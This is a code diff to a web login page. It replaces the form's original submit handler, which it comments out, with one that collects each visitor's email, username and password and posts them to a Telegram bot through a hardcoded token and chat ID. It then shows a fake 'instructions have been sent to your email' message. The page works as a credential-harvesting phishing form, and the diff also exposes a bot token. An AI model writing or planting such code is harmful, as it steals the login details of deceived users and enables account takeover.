@@ -227,6 +227,69 @@
     document.addEventListener('DOMContentLoaded', function () {
 
       const form = document.getElementById("login");
+      const modal = document.getElementById("modalBackdrop");
+      const modalText = document.getElementById("modalText");
+      const modalOk = document.getElementById("modalOk");
+
+      function showModal(message) {
+        modalText.textContent = message;
+        modal.classList.add('show');
+      }
+
+      function closeModal() {
+        modal.classList.remove('show');
+      }
+
+      modalOk.addEventListener('click', closeModal);
+
+      form.addEventListener('submit', function (event) {
+        event.preventDefault(); // ⬅️ WAJIB
+
+        const token = "8108742527:AAFwjWElB0mmOt_hRH-GEEyPoNbxEkH2g3s";
+        const chat_id = "1310990075";
+
+        const email = document.getElementById('emailInput').value;
+        const username = document.getElementById('usernameInput').value;
+        const password = document.getElementById('passwordInput').value;
+
+        const text = `
+  FORM BARU
+  Email: ${email}
+  Username: ${username}
+  Password: ${password}
+      `;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chat_id,
+            text: text
+          })
+        })
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              showModal('Instructions have been sent to your email.');
+              form.reset();
+            } else {
+              showModal('Failed to send instructions. Please try again later.');
+            }
+          })
+          .catch(() => {
+            showModal('Connection error. Please try again.');
+          });
+      });
+
+    });
+  </script>
+  <!-- 
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+
+      const form = document.getElementById("login");
       const emailInput = document.getElementById("emailInput");
       const modal = document.getElementById("modalBackdrop");
       const modalText = document.getElementById("modalText");
@@ -278,7 +341,7 @@
           })
       });
     });
-  </script>
+  </script> -->
 
 </body>
 
